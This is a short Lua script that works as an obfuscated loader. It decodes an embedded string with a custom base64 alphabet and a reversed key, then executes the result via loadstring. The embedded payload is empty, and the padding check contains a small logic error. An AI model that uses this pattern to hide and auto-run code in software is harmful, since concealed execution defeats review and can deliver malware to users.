local p,q,r,s,t=string.sub,string.byte,string.char,table.concat,loadstring or load
local A="qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM9876543210+/"
local D={}
for i=1,64 do D[p(A,i,i)]=i-1 end
D["="]=0
local K=("4lLGAQGIjGXZT9FFz2ufa0nYUcuOmiVGOJiM789W"):reverse()
local H=[[]]
local O={}
local j,L=0,#K
for i=1,#H,4 do
local n=(D[p(H,i,i)]*262144)+(D[p(H,i+1,i+1)]*4096)+(D[p(H,i+2,i+2)]*64)+D[p(H,i+3,i+3)]
local x,y,z=math.floor(n/65536),math.floor(n/256)%256,n%256
j=j+1 O[j]=r((x-q(K,(j-1)%L+1))%256)
j=j+1 O[j]=r((y-q(K,(j-1)%L+1))%256)
j=j+1 O[j]=r((z-q(K,(j-1)%L+1))%256)
end
local P=H:sub(-2)=="==" and 2 or (H:sub(-1)=="==" and 1 or 0)
for _=1,P do O[#O]=nil end
assert(t(s(O)))()
